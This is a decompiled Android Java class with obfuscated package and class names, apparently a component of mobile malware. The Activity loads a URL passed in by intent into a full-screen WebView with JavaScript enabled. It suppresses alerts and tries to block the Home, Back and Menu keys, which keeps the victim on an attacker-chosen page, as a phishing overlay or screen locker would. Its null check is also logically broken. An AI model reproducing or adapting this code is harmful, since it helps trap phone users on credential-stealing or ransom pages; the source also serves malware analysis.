package wocwvy.czyxoxmbauu.slsa.ncec;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Bundle;
import android.view.KeyEvent;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import wocwvy.czyxoxmbauu.slsa.C0020b;
import wocwvy.czyxoxmbauu.slsa.C0022c;

/* JADX INFO: loaded from: classes.dex */
public class khypzruy extends Activity {

    /* JADX INFO: renamed from: a */
    C0022c f454a = new C0022c();

    /* JADX INFO: renamed from: b */
    C0020b f455b = new C0020b();

    /* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.ncec.khypzruy$a */
    private class C0035a extends WebChromeClient {
        private C0035a() {
        }

        @Override // android.webkit.WebChromeClient
        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }
    }

    /* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.ncec.khypzruy$b */
    private class C0036b extends WebViewClient {
        private C0036b() {
        }

        @Override // android.webkit.WebViewClient
        public void onPageFinished(WebView webView, String str) {
        }

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }

    @Override // android.app.Activity
    public void onBackPressed() {
        super.onBackPressed();
    }

    @Override // android.app.Activity
    @SuppressLint({"SetJavaScriptEnabled"})
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
    }

    @Override // android.app.Activity
    public void onDestroy() {
        super.onDestroy();
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 3 || i == 4 || i == 82;
    }

    @Override // android.app.Activity
    protected void onStart() {
        super.onStart();
        String stringExtra = getIntent().getStringExtra("url");
        if (stringExtra.equals("") && stringExtra.equals(null)) {
            return;
        }
        WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setScrollBarStyle(0);
        webView.setWebViewClient(new C0036b());
        webView.setWebChromeClient(new C0035a());
        webView.loadUrl(stringExtra);
        setContentView(webView);
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
    }
}
